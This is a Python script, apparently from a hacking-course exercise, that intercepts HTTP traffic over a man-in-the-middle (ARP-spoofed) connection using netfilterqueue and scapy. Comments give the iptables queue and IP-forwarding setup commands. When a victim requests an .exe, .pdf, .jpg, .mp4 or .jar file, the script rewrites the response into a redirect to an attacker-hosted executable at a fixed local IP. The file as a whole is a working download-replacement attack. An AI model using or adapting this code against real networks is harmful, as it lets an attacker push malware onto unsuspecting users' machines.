#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# before anything run the below command in you machine
# creating queue to trap incoming packets
## iptables -I FORWARD -j NFQUEUE --queue-num 0
## echo 1 > /proc/sys/net/ipv4/ip_forward

# to test search for speedbit.com

# ARP spoof on one tab
# file interceptor on another

# In TCP layer if dport(dest port) is http it is a request and if sport(src port) is http then it is response
# sequence no in TCP layer of response is same as Ack no in TCP layer of request

ack_list = []
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # Http info is usually in RAW layer
    list_of_things = ['.exe', '.pdf', '.jpg', '.mp4', '.jar']
    # print(scapy_packet.show())
    try:
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 8080 and b"192.168.217.131" not in scapy_packet[scapy.Raw].load:
                for item in list_of_things:
                    if item in str(scapy_packet[scapy.Raw].load):
                        # print(scapy_packet[scapy.TCP])
                        print("[+] "+item+" requested")
                        ack_list.append(scapy_packet[scapy.TCP].ack)
                        #print(ack_list)
                        # http request dport
                        # print("This is request \n\n"+str(scapy_packet.show()))
            elif scapy_packet[scapy.TCP].sport == 8080:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("\r[+] Replacing file......", end="")
                            # http response sport
                    scapy_packet[scapy.Raw].load ="HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.217.131/all/Ajlal_HACKTHEBOX.exe\n\n"
                            # removing chksum and len field that may corrupt our modified packet from ip layer

                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.IP].len
                            # removing chksum field that may corrupt our modified packet from udp layer
                    del scapy_packet[scapy.TCP].chksum
                            # deleting helps us as scapy will include these fields itself after calculating them
                    packet.set_payload(bytes(scapy_packet))
                    print("\n [+] File replaced successfully....")
        packet.accept()

    except Exception as e:
        print(e,end="")


queue = netfilterqueue.NetfilterQueue()
queue.bind(2, process_packet)
queue.run()
